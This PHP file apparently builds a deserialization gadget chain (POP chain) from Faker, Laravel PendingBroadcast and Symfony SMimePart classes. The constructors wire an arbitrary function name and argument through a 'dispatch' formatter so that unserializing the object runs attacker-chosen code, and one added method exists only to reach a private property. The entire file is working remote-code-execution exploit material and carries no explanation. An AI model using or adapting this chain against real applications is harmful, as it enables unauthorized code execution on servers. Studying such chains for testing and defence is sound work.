<?php

namespace Faker
{
    class Generator
    {
        protected $providers = [];
        protected $formatters = [];
        function __construct(&$formatters)
        {
            $this->formatter = "dispatch";
            $this->formatters = &$formatters;
        }
    }
}

namespace Illuminate\Broadcasting
{
    class PendingBroadcast
    {
        public function __construct(&$formatters, $parameter)
        {
            $this->event = $parameter;
            $this->events = new \Faker\Generator($formatters);
        }
    }
}

namespace Symfony\Component\Mime\Part
{
    abstract class AbstractPart
    {
        private $headers = null;

        /**
         * This function is not in the original code. It just allows us to get a
         * reference to the private $header properties easily.
         */
        public function createBroadcast($parameter)
        {
            return new \Illuminate\Broadcasting\PendingBroadcast($this->headers, $parameter);
        }
    }

    class SMimePart extends AbstractPart
    {
        protected $_headers;
        public $inhann;

        function __construct($function, $parameter)
        {
            $this->_headers = ["dispatch" => $function];
            $this->inhann = $this->createBroadcast($parameter);
        }
    }
}
